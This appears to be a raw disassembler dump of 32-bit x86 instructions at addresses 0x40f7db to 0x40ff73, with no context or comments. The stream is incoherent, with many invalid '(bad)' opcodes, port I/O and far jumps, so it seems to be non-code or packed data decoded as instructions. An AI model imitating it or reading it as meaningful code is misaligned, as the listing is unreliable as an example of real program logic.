  40f7db:	or     DWORD PTR [ebx-0x4d6c7c4e],ebx
  40f7e1:	mov    BYTE PTR [edx],0x18
  40f7e4:	ja     0x40f85b
  40f7e6:	mov    eax,0xb225104e
  40f7eb:	cmp    al,0x6b
  40f7ed:	adc    BYTE PTR [esi+0x1a],bl
  40f7f0:	xor    eax,0x116a6f1e
  40f7f5:	(bad)  
  40f7f6:	fwait
  40f7f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7f8:	in     al,dx
	...
  40f83d:	add    BYTE PTR [eax],al
  40f83f:	adc    DWORD PTR [ebp-0x1caa2],esp
  40f845:	jnp    0x40f7ec
  40f847:	int    0xa1
  40f849:	ficom  WORD PTR [ebp+ecx*4+0x79]
  40f84d:	mov    ch,0xac
  40f84f:	or     esi,edi
  40f851:	add    BYTE PTR [eax],al
  40f853:	and    al,BYTE PTR [edi]
  40f855:	add    BYTE PTR [eax],al
  40f857:	mov    esi,0x9390abed
  40f85c:	sahf   
  40f85d:	jo     0x40f81c
  40f85f:	aas    
  40f860:	gs push 0x8039f6f3
  40f866:	imul   esp,ebx,0x2a
  40f869:	push   ecx
  40f86a:	(bad)  
  40f86b:	xchg   BYTE PTR [edx-0x2d],ch
  40f86e:	fist   WORD PTR [esp+ebx*2]
  40f871:	in     eax,dx
  40f872:	xchg   ebp,eax
  40f873:	out    0x70,eax
  40f875:	retf   0xe12f
  40f878:	fimul  DWORD PTR [ebx+ebp*1]
  40f87b:	push   edx
  40f87c:	in     al,0xd7
  40f87e:	outs   dx,DWORD PTR ds:[esi]
  40f87f:	retf   
  40f880:	shl    al,0xb6
  40f883:	adc    al,dl
  40f885:	push   eax
  40f886:	lds    edx,FWORD PTR [eax+esi*2]
  40f889:	out    0x3f,eax
  40f88b:	out    0x94,al
  40f88d:	lods   eax,DWORD PTR ds:[esi]
  40f88e:	and    DWORD PTR [ebp+0x41],ebp
  40f891:	add    dl,BYTE PTR [edi+ebx*2+0x4068a9c8]
  40f898:	adc    al,0x3a
  40f89a:	push   ebx
  40f89b:	int3   
  40f89c:	retf   0x80ae
  40f89f:	mov    dh,BYTE PTR [esi]
  40f8a1:	outs   dx,DWORD PTR ds:[esi]
  40f8a2:	fwait
  40f8a3:	mov    DWORD PTR [ecx+0x3577cabb],esp
  40f8a9:	add    BYTE PTR [esp+edi*1+0x160c20a2],ch
  40f8b0:	and    al,0x62
  40f8b2:	push   esp
  40f8b3:	inc    ebx
  40f8b4:	mov    dh,0xb3
  40f8b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8b7:	mov    ebp,0x72d4b659
  40f8bc:	mov    cl,0xbe
  40f8be:	dec    edx
  40f8bf:	and    ecx,esi
  40f8c1:	dec    esp
  40f8c2:	stos   BYTE PTR es:[edi],al
  40f8c3:	jno    0x40f85b
  40f8c5:	xor    DWORD PTR [edx-0x29],0xbb278433
  40f8cc:	les    ecx,FWORD PTR [edx-0x69]
  40f8cf:	pusha  
  40f8d0:	push   ebx
  40f8d1:	mov    al,ds:0x36d08cbd
  40f8d6:	cwde   
  40f8d7:	lods   eax,DWORD PTR ds:[esi]
  40f8d8:	push   es
  40f8d9:	lahf   
  40f8da:	sub    dh,dl
  40f8dc:	mov    edx,0x680c0619
  40f8e1:	out    0xdd,eax
  40f8e3:	adc    DWORD PTR [eax-0x59],esp
  40f8e6:	pop    esp
  40f8e7:	iret   
  40f8e8:	cmp    bl,BYTE PTR ds:0xe7c9c214
  40f8ee:	mov    ds:0x9200c06b,al
  40f8f3:	jmp    0x40f94d
  40f8f5:	mov    ds:0xdd0591d7,eax
  40f8fa:	scas   eax,DWORD PTR es:[edi]
  40f8fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8fc:	mov    ebx,0xf87819e1
  40f901:	psraw  mm4,mm5
  40f904:	and    al,0x2e
  40f906:	push   es
  40f907:	scas   al,BYTE PTR es:[edi]
  40f908:	enter  0x1e4b,0x86
  40f90c:	fidivr WORD PTR [edi]
  40f90e:	fidivr DWORD PTR [esi-0x42]
  40f911:	sbb    ah,BYTE PTR [edi]
  40f913:	enter  0x1b7b,0xa3
  40f917:	ret    
  40f918:	sbb    ah,0xab
  40f91b:	inc    ebp
  40f91c:	js     0x40f910
  40f91e:	cmp    eax,0x21533ff
  40f923:	dec    ebp
  40f924:	stc    
  40f925:	loope  0x40f98a
  40f927:	inc    edi
  40f928:	outs   dx,DWORD PTR ds:[esi]
  40f929:	outs   dx,DWORD PTR ds:[esi]
  40f92a:	jbe    0x40f8b2
  40f92c:	sbb    ebp,DWORD PTR [ecx-0x5a]
  40f92f:	cld    
  40f930:	xor    dh,BYTE PTR [edx-0x41]
  40f933:	sbb    ah,bl
  40f935:	push   es
  40f936:	enter  0x3473,0x52
  40f93a:	push   es
  40f93b:	(bad)  
  40f93c:	and    al,BYTE PTR [eax+edx*4+0x6b76059b]
  40f943:	in     eax,dx
  40f944:	mov    WORD PTR [edi],fs
  40f946:	sahf   
  40f947:	stos   BYTE PTR es:[edi],al
  40f948:	(bad)  
  40f949:	jg     0x40f917
  40f94b:	push   0x57
  40f94d:	add    al,0xa9
  40f94f:	mov    dh,0x75
  40f951:	push   ss
  40f952:	cmp    ch,dl
  40f954:	dec    esp
  40f955:	fstp   QWORD PTR [eax]
  40f957:	mov    dh,0x9c
  40f959:	xlat   BYTE PTR ds:[ebx]
  40f95a:	int    0x8f
  40f95c:	jg     0x40f9ae
  40f95e:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f960:	sub    DWORD PTR fs:[bp+di+0x27bf],ebx
  40f966:	scas   eax,DWORD PTR es:[edi]
  40f967:	and    al,0xdd
  40f969:	ret    0x1a70
  40f96c:	xor    eax,0x7b905d09
  40f971:	mov    al,0xb0
  40f973:	scas   al,BYTE PTR es:[edi]
  40f974:	(bad)  
  40f975:	xchg   ah,cl
  40f977:	iret   
  40f978:	jg     0x40f9f5
  40f97a:	jmp    DWORD PTR [edi]
  40f97c:	stos   BYTE PTR es:[edi],al
  40f97d:	aas    
  40f97e:	int    0xb1
  40f980:	sbb    esi,DWORD PTR [edx+0x4e9562f]
  40f986:	les    esi,FWORD PTR [edx+eax*2+0x5b1fd1ed]
  40f98d:	dec    edx
  40f98e:	jo     0x40f9e8
  40f990:	aam    0x83
  40f992:	pop    esp
  40f993:	(bad)  
  40f994:	in     eax,0x9a
  40f996:	xchg   BYTE PTR [eax+0x7b],cl
  40f999:	and    eax,0x4e7a1aa6
  40f99e:	mov    DWORD PTR [edi+0x52],0x5abf6814
  40f9a5:	cwde   
  40f9a6:	inc    esp
  40f9a7:	mov    ah,0x8d
  40f9a9:	lods   eax,DWORD PTR ds:[esi]
  40f9aa:	cwde   
  40f9ab:	aad    0x21
  40f9ad:	scas   eax,DWORD PTR es:[edi]
  40f9ae:	mov    esi,0x9acd02b9
  40f9b3:	ja     0x40f972
  40f9b5:	and    eax,0x54343b8f
  40f9ba:	push   edx
  40f9bb:	jge    0x40f98b
  40f9bd:	adc    BYTE PTR [edx+0x1b29d557],bl
  40f9c3:	popf   
  40f9c4:	push   edx
  40f9c5:	xor    ah,bh
  40f9c7:	and    DWORD PTR [esi+0x2df43a52],edx
  40f9cd:	xchg   edx,eax
  40f9ce:	dec    edi
  40f9cf:	inc    ecx
  40f9d0:	mov    cl,0x23
  40f9d2:	pusha  
  40f9d3:	test   bl,bh
  40f9d5:	dec    ebp
  40f9d6:	push   eax
  40f9d7:	leave  
  40f9d8:	mov    edx,0xc0a0f13d
  40f9dd:	aam    0x8e
  40f9df:	rcr    ch,cl
  40f9e1:	ret    
  40f9e2:	pop    ecx
  40f9e3:	sub    eax,0x6acc12f8
  40f9e8:	mov    WORD PTR [ebx-0xacbeff1],ds
  40f9ee:	add    al,0x5
  40f9f0:	mov    ebx,0xf265f7f2
  40f9f5:	xor    ebx,DWORD PTR gs:[esi-0x3c7dd5fa]
  40f9fc:	cmp    BYTE PTR [esp+ecx*4],0x8d
  40fa00:	into   
  40fa01:	fild   DWORD PTR ss:[edi]
  40fa04:	das    
  40fa05:	cmp    al,0x9
  40fa07:	push   ebx
  40fa08:	cdq    
  40fa09:	pop    esi
  40fa0a:	add    ch,dl
  40fa0c:	mov    eax,0xb0e2e6ee
  40fa11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa12:	inc    edx
  40fa13:	or     esi,DWORD PTR [edi+0x67]
  40fa16:	stc    
  40fa17:	push   ebx
  40fa18:	pushf  
  40fa19:	ins    BYTE PTR es:[edi],dx
  40fa1a:	in     al,0x2
  40fa1c:	cmp    eax,0xde071d2e
  40fa21:	push   ds
  40fa22:	jns    0x40fa62
  40fa24:	retf   
  40fa25:	mov    ?,WORD PTR [ecx+edx*1-0x61]
  40fa29:	scas   al,BYTE PTR es:[edi]
  40fa2a:	pop    ebp
  40fa2b:	mov    ebx,0x717efe23
  40fa30:	enter  0x48e4,0x62
  40fa34:	cs scas al,BYTE PTR es:[edi]
  40fa36:	scas   al,BYTE PTR es:[edi]
  40fa37:	pop    edi
  40fa38:	pop    eax
  40fa39:	or     eax,0x9eaa583
  40fa3e:	(bad)  
  40fa3f:	leave  
  40fa40:	rol    DWORD PTR [eax+eiz*2],1
  40fa43:	jns    0x40fa3f
  40fa45:	xor    cl,dh
  40fa47:	repnz test BYTE PTR [ebx-0x390d254b],al
  40fa4e:	ins    DWORD PTR es:[edi],dx
  40fa4f:	sub    eax,0x85e1d324
  40fa54:	jbe    0x40fa5f
  40fa56:	mov    BYTE PTR [edx],bh
  40fa58:	loop   0x40fa74
  40fa5a:	xor    eax,0x25d9c612
  40fa5f:	frstor [eax+0x2279d1b1]
  40fa65:	xchg   DWORD PTR [esp+edx*8],ebx
  40fa68:	retf   0x611f
  40fa6b:	in     al,dx
  40fa6c:	outs   dx,BYTE PTR ds:[esi]
  40fa6d:	mov    eax,0x38c3de14
  40fa72:	inc    esp
  40fa73:	xor    edx,ebp
  40fa75:	push   cs
  40fa76:	xchg   ebx,eax
  40fa77:	lods   eax,DWORD PTR ds:[si]
  40fa79:	and    esi,DWORD PTR [ebx-0x15]
  40fa7c:	addr16 sbb al,0xe8
  40fa7f:	mov    WORD PTR [edi+0x6e],fs
  40fa82:	dec    eax
  40fa83:	test   al,0xc3
  40fa85:	jge    0x40fa5c
  40fa87:	xchg   DWORD PTR [esp+edi*4+0x1e],ebx
  40fa8b:	js     0x40fa68
  40fa8d:	jecxz  0x40fa4f
  40fa8f:	adc    BYTE PTR [ebp-0x701f4da9],bh
  40fa95:	out    0x28,eax
  40fa97:	test   BYTE PTR [ebp-0xe],0xc9
  40fa9b:	pop    esp
  40fa9c:	xor    ecx,DWORD PTR [esi+0x34]
  40fa9f:	push   ebx
  40faa0:	sub    dl,BYTE PTR [eax+0x4]
  40faa3:	jno    0x40fac9
  40faa5:	ins    BYTE PTR es:[edi],dx
  40faa6:	pop    edx
  40faa7:	(bad)  
  40faa8:	jg     0x40fab5
  40faaa:	sahf   
  40faab:	mov    DWORD PTR [ebp+0x37452184],esp
  40fab1:	nop
  40fab2:	out    0x3a,al
  40fab4:	mov    esi,0xc3b3956b
  40fab9:	imul   edx,DWORD PTR [esi],0xffffff8a
  40fabc:	and    al,0x6a
  40fabe:	fist   WORD PTR [eax-0x2afe722c]
  40fac4:	mov    dl,0xf5
  40fac6:	jne    0x40fa7a
  40fac8:	pop    ebx
  40fac9:	sbb    al,0x86
  40facb:	jge    0x40fb01
  40facd:	push   ebx
  40face:	xchg   esi,eax
  40facf:	cmp    DWORD PTR [esp+edx*2],esi
  40fad2:	mov    BYTE PTR [ebp-0x2c162345],al
  40fad8:	add    eax,0xa77ca7
  40fadd:	leave  
  40fade:	aaa    
  40fadf:	mov    ds:0xb42cae61,eax
  40fae4:	pop    ds
  40fae5:	mov    al,ds:0x3b4ed799
  40faea:	call   0xe71d:0xcce01258
  40faf1:	loop   0x40fb42
  40faf3:	push   esp
  40faf4:	mov    es,esp
  40faf6:	add    eax,0x5d01211b
  40fafb:	icebp  
  40fafc:	cmc    
  40fafd:	fs sahf 
  40faff:	sahf   
  40fb00:	push   eax
  40fb01:	xor    DWORD PTR [ebx-0x38f5816c],0x419f6cc8
  40fb0b:	shl    DWORD PTR [eax-0x657f942a],cl
  40fb11:	(bad)  
  40fb12:	retf   
  40fb13:	xor    bl,ah
  40fb15:	pop    ebx
  40fb16:	mov    ecx,0x2647b18b
  40fb1b:	jo     0x40fb42
  40fb1d:	pop    edx
  40fb1e:	das    
  40fb1f:	sbb    bh,BYTE PTR [esi-0x427bbb96]
  40fb25:	jp     0x40fb87
  40fb27:	jle    0x40fb37
  40fb29:	test   DWORD PTR [edi],esp
  40fb2b:	push   0x846e900f
  40fb30:	iret   
  40fb31:	out    dx,eax
  40fb32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb33:	je     0x40facb
  40fb35:	test   BYTE PTR [edx-0x11],0xb0
  40fb39:	or     eax,0x7a0e2f90
  40fb3e:	jne    0x40fb16
  40fb40:	clc    
  40fb41:	clc    
  40fb42:	sbb    eax,ebx
  40fb44:	test   DWORD PTR [ebp+edi*2-0x6b],ecx
  40fb48:	push   ebp
  40fb49:	aad    0x60
  40fb4b:	xor    cl,dl
  40fb4d:	out    0x3b,eax
  40fb4f:	popf   
  40fb50:	ins    BYTE PTR es:[edi],dx
  40fb51:	sub    edi,DWORD PTR [ecx]
  40fb53:	pushf  
  40fb54:	mov    bl,0xc9
  40fb56:	rol    BYTE PTR [esp+edi*8+0x75],cl
  40fb5a:	stc    
  40fb5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb5c:	adc    eax,0x86df2a02
  40fb61:	stc    
  40fb62:	jbe    0x40fba1
  40fb64:	int3   
  40fb65:	mov    ebp,DWORD PTR [ebx+0xac6ec08]
  40fb6b:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40fb6d:	fmulp  st(7),st
  40fb6f:	mov    dh,0xe
  40fb71:	inc    ebx
  40fb72:	shl    BYTE PTR [ebx+0x30503dd7],1
  40fb78:	gs callw 0x67be
  40fb7d:	mov    ecx,0xdec6d7ed
  40fb82:	push   esi
  40fb83:	jno    0x40fbbd
  40fb85:	sub    DWORD PTR [edx-0x63],ecx
  40fb88:	loope  0x40fb69
  40fb8a:	sub    BYTE PTR [esi+eax*1+0x56],dl
  40fb8e:	mov    esi,0x13253e4
  40fb93:	mov    ecx,0x533851d2
  40fb98:	(bad)  
  40fb99:	push   cs
  40fb9a:	stos   DWORD PTR es:[edi],eax
  40fb9b:	sbb    DWORD PTR [edx],ecx
  40fb9d:	in     al,dx
  40fb9e:	fwait
  40fb9f:	mov    ecx,0x758971f9
  40fba4:	in     eax,0xa5
  40fba6:	stos   BYTE PTR es:[edi],al
  40fba7:	lea    ecx,[esi+0x5a58c0dd]
  40fbad:	mov    esp,0xa855a673
  40fbb2:	or     BYTE PTR [eax+0x5fd381a6],dl
  40fbb8:	cmc    
  40fbb9:	test   eax,0xecba17f1
  40fbbe:	pop    ss
  40fbbf:	fidivr DWORD PTR [edx-0x62]
  40fbc2:	mov    ebx,ds
  40fbc4:	xchg   ecx,eax
  40fbc5:	fidivr WORD PTR [ebp-0x7d6e4f0a]
  40fbcb:	mov    dh,0x7b
  40fbcd:	int3   
  40fbce:	in     eax,dx
  40fbcf:	xor    eax,0x19b61a90
  40fbd4:	icebp  
  40fbd5:	and    al,0x3b
  40fbd7:	popf   
  40fbd8:	gs mov eax,0xa7352752
  40fbde:	adc    BYTE PTR [ecx],dh
  40fbe0:	jae    0x40fbc6
  40fbe2:	mov    bh,BYTE PTR [eax-0x55fd173b]
  40fbe8:	jmp    0x40fb93
  40fbea:	pop    ebp
  40fbeb:	adc    al,0x75
  40fbed:	daa    
  40fbee:	inc    eax
  40fbef:	or     ebp,edi
  40fbf1:	test   DWORD PTR [ecx+0x3b],ebp
  40fbf4:	jp     0x40fbee
  40fbf6:	mov    ch,BYTE PTR [ebp+0x43fa25e8]
  40fbfc:	push   esi
  40fbfd:	and    cl,bl
  40fbff:	sub    DWORD PTR [esp+ecx*4-0x60],0x75
  40fc04:	cs jb  0x40fbc8
  40fc07:	jns    0x40fb8a
  40fc09:	jno    0x40fc27
  40fc0b:	test   edi,ecx
  40fc0d:	sbb    BYTE PTR [ecx-0x6b],0x3a
  40fc11:	push   ecx
  40fc12:	cli    
  40fc13:	jbe    0x40fbee
  40fc15:	adc    al,0x8e
  40fc17:	mov    al,ds:0x68c3054d
  40fc1c:	inc    eax
  40fc1d:	test   al,0xf7
  40fc1f:	xchg   DWORD PTR [esp+esi*4],ebx
  40fc22:	outs   dx,DWORD PTR ds:[esi]
  40fc23:	aas    
  40fc24:	add    eax,0xa16e23d3
  40fc29:	int    0x5e
  40fc2b:	cmp    esp,DWORD PTR [ebp+esi*4-0x4]
  40fc2f:	push   ecx
  40fc30:	in     al,0x87
  40fc32:	gs cmc 
  40fc34:	cpuid  
  40fc36:	addr16 xchg ebx,eax
  40fc38:	cmp    DWORD PTR [eax],0xa5be24e0
  40fc3e:	inc    esp
  40fc3f:	pop    ebp
  40fc40:	fsub   DWORD PTR [eax+0x67e76df9]
  40fc46:	and    bl,BYTE PTR [ebp+0x3fb67298]
  40fc4c:	add    DWORD PTR [ecx+0x13],edx
  40fc4f:	ins    BYTE PTR es:[edi],dx
  40fc50:	loopne 0x40fc59
  40fc52:	sar    DWORD PTR [eax-0x7b13ffc],1
  40fc58:	into   
  40fc59:	add    al,0x2e
  40fc5b:	in     al,0x2
  40fc5d:	pop    eax
  40fc5e:	aas    
  40fc5f:	(bad)  
  40fc60:	sub    al,0x55
  40fc62:	jbe    0x40fc86
  40fc64:	jns    0x40fbf3
  40fc66:	(bad)  
  40fc67:	jno    0x40fc66
  40fc69:	push   0xffffffac
  40fc6b:	pop    ebx
  40fc6c:	mov    bl,0x33
  40fc6e:	pusha  
  40fc6f:	dec    edx
  40fc70:	push   edx
  40fc71:	mov    bl,0xae
  40fc73:	adc    bh,BYTE PTR [ebp+0xfbe900b]
  40fc79:	fistp  DWORD PTR [ebp+0x42]
  40fc7c:	into   
  40fc7d:	mov    DWORD PTR [edx-0x72c54978],0xc9231d88
  40fc87:	call   0x2949:0xd0181e37
  40fc8e:	mov    al,ds:0xe419db05
  40fc93:	mov    BYTE PTR [edi-0x30711ae2],0x60
  40fc9a:	addr16 stc 
  40fc9c:	and    BYTE PTR [esi],bl
  40fc9e:	bound  edx,QWORD PTR [edx+eax*8-0x5c]
  40fca2:	xor    esi,DWORD PTR [eax+0x72fd9c3b]
  40fca8:	inc    edx
  40fca9:	popf   
  40fcaa:	(bad)  
  40fcab:	mov    al,ds:0xafcb429c
  40fcb0:	lock cdq 
  40fcb2:	jmp    0x5213:0xec4c7216
  40fcb9:	pop    edx
  40fcba:	addr16 ja 0x40fd39
  40fcbd:	lea    esi,[ebx]
  40fcbf:	outs   dx,DWORD PTR ds:[esi]
  40fcc0:	mov    ?,WORD PTR [eax]
  40fcc2:	sbb    DWORD PTR cs:[edx+0x5ed45d6d],0x57fe9240
  40fccd:	and    DWORD PTR [ebx],esi
  40fccf:	fadd   QWORD PTR [edi-0x62]
  40fcd2:	add    eax,0x1d9b61dc
  40fcd7:	stos   BYTE PTR es:[edi],al
  40fcd8:	mov    ds:0x14b8b117,al
  40fcdd:	cmp    bh,BYTE PTR [ecx]
  40fcdf:	or     cl,BYTE PTR [edi-0x49]
  40fce2:	sub    al,0x83
  40fce4:	xor    ebx,DWORD PTR [ebx-0x5e]
  40fce7:	add    DWORD PTR [edx-0x2795f9c8],esp
  40fced:	add    BYTE PTR [eax],dh
  40fcef:	xchg   edx,eax
  40fcf0:	add    al,0x72
  40fcf2:	sbb    al,0x8b
  40fcf4:	pushf  
  40fcf5:	pushf  
  40fcf6:	fmul   QWORD PTR [edx]
  40fcf8:	adc    BYTE PTR [ecx-0x30e18fcc],ch
  40fcfe:	fdiv   QWORD PTR [ebp-0x7359080c]
  40fd04:	stos   DWORD PTR es:[edi],eax
  40fd05:	cmp    ecx,DWORD PTR [ecx]
  40fd07:	cmc    
  40fd08:	cli    
  40fd09:	pop    esi
  40fd0a:	je     0x40fc90
  40fd0c:	shl    BYTE PTR [esi],cl
  40fd0e:	pop    ebx
  40fd0f:	loop   0x40fcef
  40fd11:	and    ch,ah
  40fd13:	bound  ebp,QWORD PTR [ebp+ecx*8+0x68]
  40fd17:	int3   
  40fd18:	jne    0x40fcca
  40fd1a:	ror    cl,cl
  40fd1c:	sti    
  40fd1d:	enter  0x81d0,0xfc
  40fd21:	clc    
  40fd22:	xor    eax,0x658d250
  40fd27:	fsub   DWORD PTR [edx+0x5080220b]
  40fd2d:	mov    DWORD PTR [ebx+0x4e],edx
  40fd30:	mov    dh,0x48
  40fd32:	jle    0x40fd8d
  40fd34:	push   edi
  40fd35:	cmp    al,0x8c
  40fd37:	jnp    0x40fd0e
  40fd39:	push   ebp
  40fd3a:	xchg   esi,eax
  40fd3b:	pusha  
  40fd3c:	das    
  40fd3d:	fs cwde 
  40fd3f:	js     0x40fd3e
  40fd41:	sub    eax,0x2950c9a5
  40fd46:	(bad)  
  40fd47:	push   ebx
  40fd48:	xchg   ecx,eax
  40fd49:	repnz out 0xee,eax
  40fd4c:	out    0x6e,al
  40fd4e:	fs inc ebp
  40fd50:	or     BYTE PTR [ecx+0x70],cl
  40fd53:	(bad)  
  40fd54:	jb     0x40fcfe
  40fd56:	sbb    al,0xc1
  40fd58:	add    DWORD PTR [edx],0xffffffb5
  40fd5b:	mov    esi,0x8436796c
  40fd60:	push   ecx
  40fd61:	mov    esp,0x75339e07
  40fd66:	ret    0x2ac3
  40fd69:	lods   eax,DWORD PTR ds:[esi]
  40fd6a:	xchg   esp,eax
  40fd6b:	mov    esi,0x53815b27
  40fd70:	pop    ecx
  40fd71:	sbb    DWORD PTR [ecx-0x27cb718a],ebp
  40fd77:	add    al,0x63
  40fd79:	neg    DWORD PTR [ebx]
  40fd7b:	sub    bl,BYTE PTR [ecx-0x7b05d2db]
  40fd81:	dec    ebx
  40fd82:	fimul  DWORD PTR [esi+0x27]
  40fd85:	jo     0x40fd8d
  40fd87:	xor    ebp,DWORD PTR [edx+ebp*4-0x39]
  40fd8b:	add    dl,BYTE PTR [ebx+ebp*1]
  40fd8e:	jnp    0x40fde5
  40fd90:	fmul   st,st(2)
  40fd92:	sbb    DWORD PTR [ecx+0x3fcf583],ebp
  40fd98:	stc    
  40fd99:	mov    DWORD PTR [eax-0x8],ebp
  40fd9c:	rcl    dh,cl
  40fd9e:	popa   
  40fd9f:	retf   0x9de
  40fda2:	push   0xffffffdd
  40fda4:	imul   esi,DWORD PTR [edi-0x3f89fab0],0x66
  40fdab:	sub    bl,al
  40fdad:	sub    DWORD PTR [eax+ecx*2-0x7d],esi
  40fdb1:	inc    edx
  40fdb2:	cmc    
  40fdb3:	mul    BYTE PTR [eax+eax*2-0x2494bbe0]
  40fdba:	jp     0x40fdb9
  40fdbc:	or     BYTE PTR [edx+ebp*2-0x16],dl
  40fdc0:	add    BYTE PTR [eax+eax*8+0xa],al
  40fdc4:	ret    0x7b0b
  40fdc7:	push   ecx
  40fdc8:	cmp    eax,0xe4073441
  40fdcd:	push   cs
  40fdce:	jmp    0x817b6fe7
  40fdd3:	sub    edi,DWORD PTR [edi]
  40fdd5:	jns    0x40fd90
  40fdd7:	jae    0x40fd62
  40fdd9:	test   eax,0x5b99db41
  40fdde:	ins    DWORD PTR es:[edi],dx
  40fddf:	lea    ebx,[ebx+0x66]
  40fde2:	dec    ebp
  40fde3:	add    ecx,ecx
  40fde5:	or     eax,0x8e75f227
  40fdea:	pop    ebp
  40fdeb:	(bad)  
  40fdec:	std    
  40fded:	enter  0xdff0,0xbf
  40fdf1:	xor    al,0x54
  40fdf3:	mov    bl,0xfc
  40fdf5:	and    al,0x11
  40fdf7:	and    al,0x48
  40fdf9:	enter  0xd4d7,0xb5
  40fdfd:	mov    ss:0x40d75c02,al
  40fe03:	xor    DWORD PTR [edx],0x90f89c30
  40fe09:	jbe    0x40fdc2
  40fe0b:	je     0x40fe2c
  40fe0d:	inc    ebx
  40fe0e:	push   0xac7fecc1
  40fe13:	xchg   esp,eax
  40fe14:	push   ss
  40fe15:	(bad)  
  40fe16:	pop    edi
  40fe17:	mov    cs,edi
  40fe19:	adc    DWORD PTR [ebp+0x4ce53b14],eax
  40fe1f:	aad    0x66
  40fe21:	enter  0x523,0xa8
  40fe25:	in     al,dx
  40fe26:	lea    ebx,[edx-0x72fb717d]
  40fe2c:	inc    ebp
  40fe2d:	sub    esi,esi
  40fe2f:	mov    ecx,0x8c5e827e
  40fe34:	push   edx
  40fe35:	test   DWORD PTR [edx],ebp
  40fe37:	dec    ebp
  40fe38:	sar    BYTE PTR [ecx-0x554c2ea4],1
  40fe3e:	jp     0x40fe73
  40fe40:	or     BYTE PTR [edx+edi*4+0x14],ch
  40fe44:	ds dec eax
  40fe46:	sbb    al,0x71
  40fe48:	xor    ah,BYTE PTR [esp+eax*4]
  40fe4b:	ret    
  40fe4c:	iret   
  40fe4d:	cmp    al,ch
  40fe4f:	inc    ecx
  40fe50:	or     ebx,DWORD PTR [esi-0x18]
  40fe53:	sub    dh,BYTE PTR [eax]
  40fe55:	lahf   
  40fe56:	js     0x40fea8
  40fe58:	pusha  
  40fe59:	sbb    al,0x50
  40fe5b:	mov    ebp,0xc4ffc30c
  40fe60:	test   BYTE PTR [ebp-0x77],ch
  40fe63:	iret   
  40fe64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe65:	rcr    DWORD PTR [ebp-0x7fee38f8],0x13
  40fe6c:	fs sub eax,0x8dbfa139
  40fe72:	fbstp  TBYTE PTR [esi]
  40fe74:	mov    esp,DWORD PTR [edi-0x38]
  40fe77:	test   al,0xe
  40fe79:	ja     0x40fe37
  40fe7b:	jmp    0xf1083e6c
  40fe80:	fs js  0x40fe61
  40fe83:	dec    edi
  40fe84:	test   al,0x31
  40fe86:	addr16 out dx,eax
  40fe88:	pop    esp
  40fe89:	fsubr  DWORD PTR [ecx]
  40fe8b:	fs repnz mov dh,0x85
  40fe8f:	pusha  
  40fe90:	int    0x2d
  40fe92:	inc    ebp
  40fe93:	test   al,0x5b
  40fe95:	loop   0x40fe29
  40fe97:	push   ss
  40fe98:	adc    ebx,DWORD PTR [edx-0x22d70f5c]
  40fe9e:	dec    edi
  40fe9f:	sub    eax,0x970d66d9
  40fea4:	sbb    al,0xee
  40fea6:	mov    WORD PTR [edx+0x62],?
  40fea9:	mov    cl,0xaa
  40feab:	cmc    
  40feac:	inc    ebx
  40fead:	test   eax,0x65988896
  40feb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40feb3:	test   DWORD PTR [eax+ebx*2-0x45],0x759a202b
  40febb:	imul   ecx,DWORD PTR [edi-0x56],0x20a99083
  40fec2:	cmp    eax,0xf1bbcbd6
  40fec7:	xchg   ebp,eax
  40fec8:	enter  0x5f67,0x49
  40fecc:	out    0x38,eax
  40fece:	pop    di
  40fed0:	sub    ebp,ebp
  40fed2:	in     al,dx
  40fed3:	stos   BYTE PTR es:[edi],al
  40fed4:	mov    dh,0x30
  40fed6:	mov    ebp,0x807302f0
  40fedb:	int3   
  40fedc:	sbb    cl,BYTE PTR [ecx-0x34]
  40fedf:	daa    
  40fee0:	gs cmc 
  40fee2:	shl    DWORD PTR [ebx],cl
  40fee4:	pop    ds
  40fee5:	mov    al,0xdd
  40fee7:	xor    DWORD PTR [eax],esi
  40fee9:	jo     0x40feba
  40feeb:	cld    
  40feec:	jb     0x40feca
  40feee:	or     eax,0xb185c696
  40fef3:	cmp    ebx,DWORD PTR [ecx+edi*4-0x70]
  40fef7:	arpl   WORD PTR [esi],cx
  40fef9:	xchg   esp,eax
  40fefa:	(bad)  
  40fefb:	(bad)  [edx-0x4d26f8c1]
  40ff01:	pop    ebx
  40ff02:	fimul  WORD PTR [edx-0x71]
  40ff05:	push   0xffffffa7
  40ff07:	add    DWORD PTR [eax-0x41838c2a],esp
  40ff0d:	sbb    al,0x47
  40ff0f:	loope  0x40ff6e
  40ff11:	rcr    edx,0xbf
  40ff14:	cmp    eax,0xd1d0d22b
  40ff19:	xor    cl,BYTE PTR [edi+0x181bb70a]
  40ff1f:	dec    ebp
  40ff20:	mov    ebx,0x196d6c26
  40ff25:	jp     0x40ff38
  40ff27:	jae    0x40ff68
  40ff29:	xlat   BYTE PTR ds:[ebx]
  40ff2a:	loop   0x40fee3
  40ff2c:	cs in  al,dx
  40ff2e:	dec    edi
  40ff2f:	out    dx,eax
  40ff30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff31:	push   edi
  40ff32:	add    eax,0x1bdddfe2
  40ff37:	and    ebp,edi
  40ff39:	push   0x2ba1cdf6
  40ff3e:	scas   eax,DWORD PTR es:[edi]
  40ff3f:	adc    DWORD PTR [ecx-0x7789188d],0xe
  40ff46:	dec    ecx
  40ff47:	retf   0x1873
  40ff4a:	imul   BYTE PTR [eax*8-0x4216371e]
  40ff51:	mov    dl,0x8a
  40ff53:	shl    BYTE PTR [edi],1
  40ff55:	inc    eax
  40ff56:	iret   
  40ff57:	push   edx
  40ff58:	mov    BYTE PTR [edx+ecx*1+0x2e],0x1e
  40ff5d:	add    ecx,DWORD PTR [esi]
  40ff5f:	or     dl,0xe
  40ff62:	das    
  40ff63:	fbstp  TBYTE PTR [edi-0x11315f47]
  40ff69:	sub    al,BYTE PTR [ecx]
  40ff6b:	dec    edi
  40ff6c:	or     al,0x5d
  40ff6e:	fcmove st,st(4)
  40ff70:	repnz test al,0x22
  40ff73:	push   ebx
